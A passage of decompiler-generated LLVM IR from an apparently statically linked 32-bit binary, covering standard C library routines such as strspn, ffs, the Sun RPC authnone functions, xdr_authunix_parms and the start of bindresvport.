dec_label_pc_8065fbd:                             ; preds = %entry, %dec_label_pc_8065fb8
  %v0_8065fc0 = phi i32 [ %v1_8065fb8, %dec_label_pc_8065fb8 ], [ %v4_8065fae, %entry ]
  %v2_8065fc4 = mul nuw nsw i32 %v4_8065faa, 256
  %v2_8065fc7 = or i32 %v2_8065fc4, %v4_8065faa
  %v2_8065fcb = mul i32 %v2_8065fc7, 65536
  %v2_8065fce = or i32 %v2_8065fcb, %v2_8065fc7
  br label %dec_label_pc_8065fd0

dec_label_pc_8065fd0:                             ; preds = %dec_label_pc_8066000, %dec_label_pc_8065fd0, %dec_label_pc_8065fbd
  %v0_8065fd4 = phi i32 [ %v0_8065fc0, %dec_label_pc_8065fbd ], [ %v1_8065fd4, %dec_label_pc_8065fd0 ], [ %v1_8065fd4, %dec_label_pc_8066000 ]
  %v2_8065fd2 = inttoptr i32 %v0_8065fd4 to i32*
  %v3_8065fd2 = load i32, i32* %v2_8065fd2, align 4
  %v4_8065fd2 = xor i32 %v3_8065fd2, %v2_8065fce
  %v1_8065fd4 = add i32 %v0_8065fd4, 4
  store i32 %v1_8065fd4, i32* @ecx, align 4
  %v1_8065fd7 = add i32 %v4_8065fd2, 2130640639
  %v1_8065fdd = sub i32 -1, %v4_8065fd2
  store i32 %v1_8065fdd, i32* @edx, align 4
  %v2_8065fdf = xor i32 %v1_8065fd7, %v1_8065fdd
  %v1_8065fe1 = and i32 %v2_8065fdf, -2130640640
  %v2_8065fe1 = icmp eq i32 %v1_8065fe1, 0
  br i1 %v2_8065fe1, label %dec_label_pc_8065fd0, label %dec_label_pc_8065fe8

dec_label_pc_8065fe8:                             ; preds = %dec_label_pc_8065fd0
  %v2_8065feb = inttoptr i32 %v0_8065fd4 to i8*
  %v3_8065feb = load i8, i8* %v2_8065feb, align 1
  %v16_8065feb = icmp eq i8 %v3_8065feb, %v4_8065fb4
  br i1 %v16_8065feb, label %dec_label_pc_8066008, label %dec_label_pc_8065ff0

dec_label_pc_8065ff0:                             ; preds = %dec_label_pc_8065fe8
  %v1_8065ff0 = add i32 %v0_8065fd4, 1
  %v2_8065ff3 = inttoptr i32 %v1_8065ff0 to i8*
  %v3_8065ff3 = load i8, i8* %v2_8065ff3, align 1
  %v16_8065ff3 = icmp eq i8 %v3_8065ff3, %v4_8065fb4
  br i1 %v16_8065ff3, label %dec_label_pc_8066008, label %dec_label_pc_8065ff8

dec_label_pc_8065ff8:                             ; preds = %dec_label_pc_8065ff0
  %v1_8065ff8 = add i32 %v0_8065fd4, 2
  %v2_8065ffb = inttoptr i32 %v1_8065ff8 to i8*
  %v3_8065ffb = load i8, i8* %v2_8065ffb, align 1
  %v16_8065ffb = icmp eq i8 %v3_8065ffb, %v4_8065fb4
  br i1 %v16_8065ffb, label %dec_label_pc_8066008, label %dec_label_pc_8066000

dec_label_pc_8066000:                             ; preds = %dec_label_pc_8065ff8
  %v1_8066000 = add i32 %v0_8065fd4, 3
  %v2_8066003 = inttoptr i32 %v1_8066000 to i8*
  %v3_8066003 = load i8, i8* %v2_8066003, align 1
  %v16_8066003 = icmp eq i8 %v3_8066003, %v4_8065fb4
  %v1_8066006 = icmp eq i1 %v16_8066003, false
  br i1 %v1_8066006, label %dec_label_pc_8065fd0, label %dec_label_pc_8066008

dec_label_pc_8066008:                             ; preds = %dec_label_pc_8065fb4, %dec_label_pc_8066000, %dec_label_pc_8065ff8, %dec_label_pc_8065ff0, %dec_label_pc_8065fe8
  %v0_806600a = phi i32 [ %v1_8066000, %dec_label_pc_8066000 ], [ %v1_8065ff8, %dec_label_pc_8065ff8 ], [ %v1_8065ff0, %dec_label_pc_8065ff0 ], [ %v0_8065fd4, %dec_label_pc_8065fe8 ], [ %v0_8065fb8, %dec_label_pc_8065fb4 ]
  store i32 %v0_8065fa9, i32* @ebx, align 4
  ret i32 %v0_806600a

; uselistorder directives
  uselistorder i32 %v1_8065fdd, { 1, 0 }
  uselistorder i32 %v1_8065fd4, { 2, 1, 0 }
  uselistorder i32 %v2_8065fc7, { 1, 0 }
  uselistorder i32 %v1_8065fb8, { 1, 0, 2 }
  uselistorder i8 %v4_8065fb4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8065fae, { 2, 1, 0 }
  uselistorder i32 %v4_8065faa, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8066008, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8065fbd, { 1, 0 }
  uselistorder label %dec_label_pc_8065fb4, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_806602e30 = load i8, i8* %arg1, align 1
  %v4_806603034 = icmp eq i8 %v2_806602e30, 0
  br i1 %v4_806603034, label %dec_label_pc_8066038, label %dec_label_pc_8066034.lr.ph

dec_label_pc_8066034.lr.ph:                       ; preds = %entry
  %v3_806602e31 = zext i8 %v2_806602e30 to i32
  %v4_806602e.pre = load i32, i32* @eax, align 4
  %v5_806602e32 = and i32 %v4_806602e.pre, -256
  %v6_806602e33 = or i32 %v3_806602e31, %v5_806602e32
  %v4_8066015 = ptrtoint i8* %arg1 to i32
  %v1_806602018 = inttoptr i32 %arg2 to i8*
  %v4_8066020.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8066034

dec_label_pc_806601b:                             ; preds = %dec_label_pc_8066034, %dec_label_pc_806601f
  %v6_806602027 = phi i32 [ %v6_8066020, %dec_label_pc_806601f ], [ %v6_806602022, %dec_label_pc_8066034 ]
  %v2_806602026 = phi i8 [ %v2_8066020, %dec_label_pc_806601f ], [ %v2_806602019, %dec_label_pc_8066034 ]
  %v0_806601f25 = phi i32 [ %v1_806601f, %dec_label_pc_806601f ], [ %arg2, %dec_label_pc_8066034 ]
  %v15_806601b = icmp eq i8 %v2_806602e37, %v2_806602026
  br i1 %v15_806601b, label %dec_label_pc_8066028, label %dec_label_pc_806601f

dec_label_pc_806601f:                             ; preds = %dec_label_pc_806601b
  %v1_806601f = add i32 %v0_806601f25, 1
  store i32 %v1_806601f, i32* @edx, align 4
  %v1_8066020 = inttoptr i32 %v1_806601f to i8*
  %v2_8066020 = load i8, i8* %v1_8066020, align 1
  %v3_8066020 = zext i8 %v2_8066020 to i32
  %v5_8066020 = and i32 %v6_806602027, -256
  %v6_8066020 = or i32 %v3_8066020, %v5_8066020
  store i32 %v6_8066020, i32* @ecx, align 4
  %v4_8066022 = icmp eq i8 %v2_8066020, 0
  %v1_8066024 = icmp eq i1 %v4_8066022, false
  br i1 %v1_8066024, label %dec_label_pc_806601b, label %dec_label_pc_8066038

dec_label_pc_8066028:                             ; preds = %dec_label_pc_806601b
  %v1_806602c = add i32 %v0_806603835, 1
  %v1_806602d = add i32 %v0_806602d36, 1
  %v1_806602e = inttoptr i32 %v1_806602d to i8*
  %v2_806602e = load i8, i8* %v1_806602e, align 1
  %v3_806602e = zext i8 %v2_806602e to i32
  %v5_806602e = and i32 %v6_806602e38, -256
  %v6_806602e = or i32 %v3_806602e, %v5_806602e
  %v4_8066030 = icmp eq i8 %v2_806602e, 0
  br i1 %v4_8066030, label %dec_label_pc_8066038, label %dec_label_pc_8066034

dec_label_pc_8066034:                             ; preds = %dec_label_pc_8066034.lr.ph, %dec_label_pc_8066028
  %v4_8066020.pre = phi i32 [ %v4_8066020.pre.pre, %dec_label_pc_8066034.lr.ph ], [ %v6_806602027, %dec_label_pc_8066028 ]
  %v6_806602e38 = phi i32 [ %v6_806602e33, %dec_label_pc_8066034.lr.ph ], [ %v6_806602e, %dec_label_pc_8066028 ]
  %v2_806602e37 = phi i8 [ %v2_806602e30, %dec_label_pc_8066034.lr.ph ], [ %v2_806602e, %dec_label_pc_8066028 ]
  %v0_806602d36 = phi i32 [ %v4_8066015, %dec_label_pc_8066034.lr.ph ], [ %v1_806602d, %dec_label_pc_8066028 ]
  %v0_806603835 = phi i32 [ 0, %dec_label_pc_8066034.lr.ph ], [ %v1_806602c, %dec_label_pc_8066028 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_806602019 = load i8, i8* %v1_806602018, align 1
  %v3_806602020 = zext i8 %v2_806602019 to i32
  %v5_806602021 = and i32 %v4_8066020.pre, -256
  %v6_806602022 = or i32 %v3_806602020, %v5_806602021
  store i32 %v6_806602022, i32* @ecx, align 4
  %v4_806602223 = icmp eq i8 %v2_806602019, 0
  %v1_806602424 = icmp eq i1 %v4_806602223, false
  br i1 %v1_806602424, label %dec_label_pc_806601b, label %dec_label_pc_8066038

dec_label_pc_8066038:                             ; preds = %entry, %dec_label_pc_8066028, %dec_label_pc_8066034, %dec_label_pc_806601f
  %v0_806603817 = phi i32 [ %v0_806603835, %dec_label_pc_806601f ], [ %v0_806603835, %dec_label_pc_8066034 ], [ 0, %entry ], [ %v1_806602c, %dec_label_pc_8066028 ]
  ret i32 %v0_806603817

; uselistorder directives
  uselistorder i32 %v6_806602022, { 1, 0 }
  uselistorder i8 %v2_806602019, { 1, 2, 0 }
  uselistorder i32 %v1_806602d, { 1, 0 }
  uselistorder i32 %v6_8066020, { 1, 0 }
  uselistorder i8 %v2_8066020, { 1, 2, 0 }
  uselistorder i32 %v1_806601f, { 2, 1, 0 }
  uselistorder i8 %v2_806602e30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8066038, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8066034, { 1, 0 }
}

define i32 @ffs(i16 %arg1) local_unnamed_addr {
entry:
  %v4_8066040 = sext i16 %arg1 to i32
  %v0_8066044 = load i32, i32* @edx, align 4
  %v1_8066044 = and i32 %v0_8066044, -256
  %v2_8066044 = or i32 %v1_8066044, 1
  %v4_8066046 = icmp eq i16 %arg1, 0
  %v1_8066049 = icmp eq i1 %v4_8066046, false
  br i1 %v1_8066049, label %dec_label_pc_8066050, label %dec_label_pc_806604b

dec_label_pc_806604b:                             ; preds = %entry
  %v2_806604b = sdiv i32 %v4_8066040, 65536
  %v2_806604e = or i32 %v1_8066044, 17
  br label %dec_label_pc_8066050

dec_label_pc_8066050:                             ; preds = %entry, %dec_label_pc_806604b
  %storemerge = phi i32 [ %v2_806604e, %dec_label_pc_806604b ], [ %v2_8066044, %entry ]
  %v0_8066057 = phi i32 [ %v2_806604e, %dec_label_pc_806604b ], [ %v2_8066044, %entry ]
  %v0_8066054 = phi i32 [ %v2_806604b, %dec_label_pc_806604b ], [ %v4_8066040, %entry ]
  %v3_8066050 = trunc i32 %v0_8066054 to i8
  %v4_8066050 = icmp eq i8 %v3_8066050, 0
  %v1_8066052 = icmp eq i1 %v4_8066050, false
  br i1 %v1_8066052, label %dec_label_pc_806605a, label %dec_label_pc_8066054

dec_label_pc_8066054:                             ; preds = %dec_label_pc_8066050
  %v2_8066054 = sdiv i32 %v0_8066054, 256
  %v1_8066057 = add i32 %v0_8066057, 8
  br label %dec_label_pc_806605a

dec_label_pc_806605a:                             ; preds = %dec_label_pc_8066050, %dec_label_pc_8066054
  %storemerge11 = phi i32 [ %v1_8066057, %dec_label_pc_8066054 ], [ %storemerge, %dec_label_pc_8066050 ]
  %v0_8066061 = phi i32 [ %v1_8066057, %dec_label_pc_8066054 ], [ %v0_8066057, %dec_label_pc_8066050 ]
  %v0_806605e = phi i32 [ %v2_8066054, %dec_label_pc_8066054 ], [ %v0_8066054, %dec_label_pc_8066050 ]
  %v2_806605a = urem i32 %v0_806605e, 16
  %v3_806605a = icmp eq i32 %v2_806605a, 0
  %v1_806605c = icmp eq i1 %v3_806605a, false
  br i1 %v1_806605c, label %dec_label_pc_8066064, label %dec_label_pc_806605e

dec_label_pc_806605e:                             ; preds = %dec_label_pc_806605a
  %v2_806605e = sdiv i32 %v0_806605e, 16
  %v1_8066061 = add i32 %v0_8066061, 4
  br label %dec_label_pc_8066064

dec_label_pc_8066064:                             ; preds = %dec_label_pc_806605a, %dec_label_pc_806605e
  %storemerge12 = phi i32 [ %v1_8066061, %dec_label_pc_806605e ], [ %storemerge11, %dec_label_pc_806605a ]
  %v0_806606b = phi i32 [ %v1_8066061, %dec_label_pc_806605e ], [ %v0_8066061, %dec_label_pc_806605a ]
  %v0_8066068 = phi i32 [ %v2_806605e, %dec_label_pc_806605e ], [ %v0_806605e, %dec_label_pc_806605a ]
  %v2_8066064 = urem i32 %v0_8066068, 4
  %v3_8066064 = icmp eq i32 %v2_8066064, 0
  %v1_8066066 = icmp eq i1 %v3_8066064, false
  br i1 %v1_8066066, label %dec_label_pc_806606e, label %dec_label_pc_8066068

dec_label_pc_8066068:                             ; preds = %dec_label_pc_8066064
  %v2_8066068 = sdiv i32 %v0_8066068, 4
  %v1_806606b = add i32 %v0_806606b, 2
  br label %dec_label_pc_806606e

dec_label_pc_806606e:                             ; preds = %dec_label_pc_8066064, %dec_label_pc_8066068
  %storemerge13 = phi i32 [ %v1_806606b, %dec_label_pc_8066068 ], [ %storemerge12, %dec_label_pc_8066064 ]
  %v0_8066075 = phi i32 [ %v1_806606b, %dec_label_pc_8066068 ], [ %v0_806606b, %dec_label_pc_8066064 ]
  %v0_8066074 = phi i32 [ %v2_8066068, %dec_label_pc_8066068 ], [ %v0_8066068, %dec_label_pc_8066064 ]
  store i32 %storemerge13, i32* @edx, align 4
  store i32 0, i32* @ecx, align 4
  %v1_8066070 = icmp eq i32 %v0_8066074, 0
  br i1 %v1_8066070, label %dec_label_pc_806607e, label %dec_label_pc_8066074

dec_label_pc_8066074:                             ; preds = %dec_label_pc_806606e
  %v1_8066075 = mul i32 %v0_8066075, 16777216
  %v2_8066075 = sdiv i32 %v1_8066075, 16777216
  store i32 %v2_8066075, i32* @edx, align 4
  %v1_8066074 = urem i32 %v0_8066074, 2
  %v1_8066078 = xor i32 %v1_8066074, 1
  %v2_806607b = add nsw i32 %v1_8066078, %v2_8066075
  store i32 %v2_806607b, i32* @ecx, align 4
  br label %dec_label_pc_806607e

dec_label_pc_806607e:                             ; preds = %dec_label_pc_806606e, %dec_label_pc_8066074
  %v0_806607e = phi i32 [ 0, %dec_label_pc_806606e ], [ %v2_806607b, %dec_label_pc_8066074 ]
  ret i32 %v0_806607e

; uselistorder directives
  uselistorder i32 %v2_8066075, { 1, 0 }
  uselistorder label %dec_label_pc_806607e, { 1, 0 }
  uselistorder label %dec_label_pc_806606e, { 1, 0 }
  uselistorder label %dec_label_pc_8066064, { 1, 0 }
  uselistorder label %dec_label_pc_806605a, { 1, 0 }
  uselistorder label %dec_label_pc_8066050, { 1, 0 }
}

define i32 @authnone_verf() local_unnamed_addr {
entry:
  %v0_8066084 = load i32, i32* @eax, align 4
  ret i32 %v0_8066084
}

define i32 @authnone_validate() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @authnone_refresh() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @authnone_destroy() local_unnamed_addr {
entry:
  %v0_806608e = load i32, i32* @eax, align 4
  ret i32 %v0_806608e
}

define i32 @authnone_marshal(i32 %arg1) local_unnamed_addr {
entry:
  %v0_806608f = load i32, i32* @ebx, align 4
  %v1_8066093 = call i32 @__rpc_thread_variables(i32 %v0_806608f)
  %v1_806609e = add i32 %v1_8066093, 152
  %v2_806609e = inttoptr i32 %v1_806609e to i32*
  %v3_806609e = load i32, i32* %v2_806609e, align 4
  %v1_80660a4 = icmp eq i32 %v3_806609e, 0
  br i1 %v1_80660a4, label %dec_label_pc_80660bc, label %dec_label_pc_80660a8

dec_label_pc_80660a8:                             ; preds = %entry
  %v1_80660a9 = add i32 %arg1, 4
  %v2_80660a9 = inttoptr i32 %v1_80660a9 to i32*
  %v3_80660a9 = load i32, i32* %v2_80660a9, align 4
  %v1_80660af = add i32 %v3_806609e, 40
  %v5_80660b4 = add i32 %v3_80660a9, 12
  %v6_80660b4 = inttoptr i32 %v5_80660b4 to i32*
  %v7_80660b4 = load i32, i32* %v6_80660b4, align 4
  call void @__pseudo_call(i32 %v7_80660b4)
  br label %dec_label_pc_80660bc

dec_label_pc_80660bc:                             ; preds = %entry, %dec_label_pc_80660a8
  %v0_80660bc = phi i32 [ 0, %entry ], [ %v1_80660af, %dec_label_pc_80660a8 ]
  ret i32 %v0_80660bc

; uselistorder directives
  uselistorder label %dec_label_pc_80660bc, { 1, 0 }
}

define i32 @authnone_create() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v0_80660c4 = load i32, i32* @ebx, align 4
  %v1_80660c8 = call i32 @__rpc_thread_variables(i32 %v0_80660c4)
  store i32 %v1_80660c8, i32* %eax.global-to-local, align 4
  store i32 %v1_80660c8, i32* @ebx, align 4
  %v1_80660cf = add i32 %v1_80660c8, 152
  %v2_80660cf = inttoptr i32 %v1_80660cf to i32*
  %v3_80660cf = load i32, i32* %v2_80660cf, align 4
  store i32 %v3_80660cf, i32* @esi, align 4
  %v1_80660d5 = icmp eq i32 %v3_80660cf, 0
  %v1_80660d7 = icmp eq i1 %v1_80660d5, false
  br i1 %v1_80660d7, label %dec_label_pc_80660f5, label %dec_label_pc_80660d9

dec_label_pc_80660d9:                             ; preds = %entry
  %v5_80660df = call i32 @calloc(i64 1, i32 64, i32 %v1_80660c8, i32 %v1_80660c8)
  store i32 %v5_80660df, i32* @esi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_80660eb = icmp eq i32 %v5_80660df, 0
  br i1 %v1_80660eb, label %dec_label_pc_806616a, label %dec_label_pc_80660ef

dec_label_pc_80660ef:                             ; preds = %dec_label_pc_80660d9
  %v1_80660ef = load i32, i32* @ebx, align 4
  %v2_80660ef = add i32 %v1_80660ef, 152
  %v3_80660ef = inttoptr i32 %v2_80660ef to i32*
  store i32 %v5_80660df, i32* %v3_80660ef, align 4
  %v0_80660f5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80660f5

dec_label_pc_80660f5:                             ; preds = %entry, %dec_label_pc_80660ef
  %v0_80660fb = phi i32 [ %v3_80660cf, %entry ], [ %v0_80660f5.pre, %dec_label_pc_80660ef ]
  %v1_80660f5 = add i32 %v0_80660fb, 60
  %v2_80660f5 = inttoptr i32 %v1_80660f5 to i32*
  %v3_80660f5 = load i32, i32* %v2_80660f5, align 4
  %v4_80660f5 = icmp eq i32 %v3_80660f5, 0
  %v1_80660f9 = icmp eq i1 %v4_80660f5, false
  br i1 %v1_80660f9, label %dec_label_pc_80660f5.dec_label_pc_8066168_crit_edge, label %dec_label_pc_80660fb

dec_label_pc_80660f5.dec_label_pc_8066168_crit_edge: ; preds = %dec_label_pc_80660f5
  br label %dec_label_pc_8066168

dec_label_pc_80660fb:                             ; preds = %dec_label_pc_80660f5
  %v1_80660fb = add i32 %v0_80660fb, 12
  store i32 %v1_80660fb, i32* @ebx, align 4
  %v3_8066107 = inttoptr i32 %v1_80660fb to i16*
  %v4_8066107 = call i32 @memcpy(i16* %v3_8066107, i32 ptrtoint (i32* @global_var_807ea20.795 to i32), i32 12)
  store i32 %v4_8066107, i32* %eax.global-to-local, align 4
  %v0_8066111 = load i32, i32* @ebx, align 4
  %v0_8066112 = load i32, i32* @esi, align 4
  %v3_8066113 = inttoptr i32 %v0_8066112 to i16*
  %v4_8066113 = call i32 @memcpy(i16* %v3_8066113, i32 %v0_8066111, i32 12)
  %v0_8066118 = load i32, i32* @esi, align 4
  %v1_8066118 = add i32 %v0_8066118, 40
  store i32 %v1_8066118, i32* %eax.global-to-local, align 4
  %v1_806611b = add i32 %v0_8066118, 32
  %v2_806611b = inttoptr i32 %v1_806611b to i32*
  store i32 ptrtoint (i32* @global_var_806e304.839 to i32), i32* %v2_806611b, align 4
  %v0_8066126 = load i32, i32* %eax.global-to-local, align 4
  %v2_8066127 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_8066127, i32* @edi, align 4
  %v5_806612c = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-36, i32 %v0_8066126, i32 20, i32 0)
  store i32 %v5_806612c, i32* %eax.global-to-local, align 4
  %v0_8066134 = load i32, i32* @esi, align 4
  %v2_8066136 = call i32 @xdr_opaque_auth(i32 %v2_8066127, i32 %v0_8066134)
  store i32 %v0_8066134, i32* %eax.global-to-local, align 4
  %v0_806613d = load i32, i32* @ebx, align 4
  %v2_806613f = call i32 @xdr_opaque_auth(i32 %v2_8066127, i32 %v0_806613d)
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v5_806614b = add i32 %tmp, 16
  %v6_806614b = inttoptr i32 %v5_806614b to i32*
  %v7_806614b = load i32, i32* %v6_806614b, align 4
  call void @__pseudo_call(i32 %v7_806614b)
  %v1_806614e = load i32, i32* @esi, align 4
  %v2_806614e = add i32 %v1_806614e, 60
  %v3_806614e = inttoptr i32 %v2_806614e to i32*
  store i32 %tmp, i32* %v3_806614e, align 4
  %v3_8066151 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_8066151, i32* %eax.global-to-local, align 4
  %v1_8066158 = add i32 %v3_8066151, 28
  %v2_8066158 = inttoptr i32 %v1_8066158 to i32*
  %v3_8066158 = load i32, i32* %v2_8066158, align 4
  store i32 %v3_8066158, i32* %eax.global-to-local, align 4
  %v1_806615b = icmp eq i32 %v3_8066158, 0
  br i1 %v1_806615b, label %dec_label_pc_8066168, label %dec_label_pc_806615f

dec_label_pc_806615f:                             ; preds = %dec_label_pc_80660fb
  call void @__pseudo_call(i32 %v3_8066158)
  br label %dec_label_pc_8066168

dec_label_pc_8066168:                             ; preds = %dec_label_pc_80660f5.dec_label_pc_8066168_crit_edge, %dec_label_pc_80660fb, %dec_label_pc_806615f
  %v0_8066168 = load i32, i32* @esi, align 4
  store i32 %v0_8066168, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806616a

dec_label_pc_806616a:                             ; preds = %dec_label_pc_80660d9, %dec_label_pc_8066168
  %v0_8066170 = phi i32 [ 0, %dec_label_pc_80660d9 ], [ %v0_8066168, %dec_label_pc_8066168 ]
  ret i32 %v0_8066170

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 60, { 18, 19, 7, 16, 17, 4, 11, 20, 9, 0, 12, 13, 1, 14, 15, 24, 22, 23, 21, 25, 26, 27, 10, 5, 2, 6, 3, 8 }
  uselistorder i32 (i64, i32, i32, i32)* @calloc, { 2, 0, 3, 1 }
  uselistorder i32 64, { 7, 5, 0, 9, 13, 6, 14, 2, 34, 35, 37, 36, 30, 31, 15, 16, 32, 17, 18, 19, 20, 38, 21, 33, 12, 22, 23, 24, 25, 26, 27, 28, 4, 10, 11, 3, 1, 29, 8 }
  uselistorder i64 1, { 2, 3, 4, 0, 1 }
  uselistorder i32 152, { 4, 5, 1, 2, 0, 3, 6, 7 }
  uselistorder label %dec_label_pc_806616a, { 1, 0 }
  uselistorder label %dec_label_pc_8066168, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80660f5, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8066174 = load i32, i32* @esi, align 4
  %v0_8066175 = load i32, i32* @ebx, align 4
  store i32 %v0_8066175, i32* %stack_var_-8, align 4
  store i32 %tmp2, i32* @esi, align 4
  %v3_8066183 = call i32 @xdr_u_long(i32* %arg1, i32 %arg2)
  %v1_806618b = icmp eq i32 %v3_8066183, 0
  br i1 %v1_806618b, label %dec_label_pc_80661f2, label %dec_label_pc_806618f

dec_label_pc_806618f:                             ; preds = %entry
  %v0_8066190 = load i32, i32* @ebx, align 4
  %v1_8066190 = add i32 %v0_8066190, 4
  %v0_8066199 = load i32, i32* @esi, align 4
  %v3_806619a = inttoptr i32 %v0_8066199 to i32*
  %v4_806619a = call i32 @__GI_xdr_string(i32* %v3_806619a, i32 %v1_8066190, i32 255)
  %v1_80661a2 = icmp eq i32 %v4_806619a, 0
  br i1 %v1_80661a2, label %dec_label_pc_80661f2, label %dec_label_pc_80661a6

dec_label_pc_80661a6:                             ; preds = %dec_label_pc_806618f
  %v0_80661a8 = load i32, i32* @ebx, align 4
  %v1_80661a8 = add i32 %v0_80661a8, 8
  store i32 %v1_80661a8, i32* @eax, align 4
  %v0_80661ac = load i32, i32* @esi, align 4
  %v4_80661ad = inttoptr i32 %v0_80661ac to i32*
  %v5_80661ad = call i32 @xdr_u_long(i32* %v4_80661ad, i32 %v1_80661a8)
  %v1_80661b5 = icmp eq i32 %v5_80661ad, 0
  br i1 %v1_80661b5, label %dec_label_pc_80661f2, label %dec_label_pc_80661b9

dec_label_pc_80661b9:                             ; preds = %dec_label_pc_80661a6
  %v0_80661bb = load i32, i32* @ebx, align 4
  %v1_80661bb = add i32 %v0_80661bb, 12
  store i32 %v1_80661bb, i32* @eax, align 4
  %v0_80661bf = load i32, i32* @esi, align 4
  %v4_80661c0 = inttoptr i32 %v0_80661bf to i32*
  %v5_80661c0 = call i32 @xdr_u_long(i32* %v4_80661c0, i32 %v1_80661bb)
  %v1_80661c8 = icmp eq i32 %v5_80661c0, 0
  br i1 %v1_80661c8, label %dec_label_pc_80661f2, label %dec_label_pc_80661cc

dec_label_pc_80661cc:                             ; preds = %dec_label_pc_80661b9
  %v0_80661cc = load i32, i32* @ebx, align 4
  %v1_80661cc = add i32 %v0_80661cc, 16
  %v0_80661cf = load i32, i32* @ecx, align 4
  %v1_80661db = add i32 %v0_80661cc, 20
  %v0_80661df = load i32, i32* @esi, align 4
  %v8_80661e0 = inttoptr i32 %v0_80661df to i32*
  %v9_80661e0 = call i32 @__GI_xdr_array(i32* %v8_80661e0, i32 %v1_80661db, i32 %v1_80661cc, i32 16, i32 4, i32 134625599, i32 %v0_80661cf, i32 %v0_80661cf)
  %v1_80661e8 = icmp eq i32 %v9_80661e0, 0
  %v1_80661ea = icmp eq i1 %v1_80661e8, false
  %v2_80661ea = zext i1 %v1_80661ea to i32
  br label %dec_label_pc_80661f4

dec_label_pc_80661f2:                             ; preds = %dec_label_pc_80661b9, %dec_label_pc_80661a6, %dec_label_pc_806618f, %entry
  br label %dec_label_pc_80661f4

dec_label_pc_80661f4:                             ; preds = %dec_label_pc_80661cc, %dec_label_pc_80661f2
  %storemerge = phi i32 [ %v2_80661ea, %dec_label_pc_80661cc ], [ 0, %dec_label_pc_80661f2 ]
  %v2_80661f5 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80661f5, i32* @ebx, align 4
  store i32 %v0_8066174, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 (i32*, i32, i32)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 255, { 0, 18, 50, 1, 2, 19, 20, 53, 15, 21, 22, 23, 24, 25, 26, 27, 28, 16, 17, 3, 4, 5, 6, 29, 30, 31, 32, 7, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 8, 9, 10, 11, 12, 51, 13, 52, 14 }
  uselistorder label %dec_label_pc_80661f4, { 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-32, align 4
  %v0_80661fb = load i32, i32* @ebx, align 4
  %v4_80661ff = ptrtoint i16* %arg2 to i32
  store i32 %v4_80661ff, i32* @ebx, align 4
  %v1_8066207 = icmp eq i16* %arg2, null
  %v1_8066209 = icmp eq i1 %v1_8066207, false
  br i1 %v1_8066209, label %dec_label_pc_8066226, label %dec_label_pc_806620b

dec_label_pc_806620b:                             ; preds = %entry
  %v2_8066210 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8066210, i32* @ebx, align 4
  %v4_8066215 = bitcast i32* %stack_var_-32 to i8*
  %v5_8066215 = call i32 @__GI_memset(i8* %v4_8066215, i32 0, i32 16)
  store i32 %v5_8066215, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-32, align 4
  br label %dec_label_pc_806623c

dec_label_pc_8066226:                             ; preds = %entry
  %v2_8066226 = load i16, i16* %arg2, align 2
  %v11_8066226 = icmp eq i16 %v2_8066226, 2
  br i1 %v11_8066226, label %dec_label_pc_806623c, label %dec_label_pc_806622c

dec_label_pc_806622c:                             ; preds = %dec_label_pc_8066226
  %v1_806622c = call i32 @__errno_location(i32 %v0_80661fb)
  %v1_8066231 = inttoptr i32 %v1_806622c to i32*
  store i32 96, i32* %v1_8066231, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80662ba

dec_label_pc_806623c:                             ; preds = %dec_label_pc_8066226, %dec_label_pc_806620b
  %v0_8066246 = phi i32 [ %tmp8, %dec_label_pc_8066226 ], [ 2, %dec_label_pc_806620b ]
  %v0_806623c = load i16, i16* @global_var_807d2a8.840, align 8
  %v1_806623c = icmp eq i16 %v0_806623c, 0
  %v1_8066244 = icmp eq i1 %v1_806623c, false
  br i1 %v1_8066244, label %dec_label_pc_8066261, label %dec_label_pc_8066246

dec_label_pc_8066246:                             ; preds = %dec_label_pc_806623c
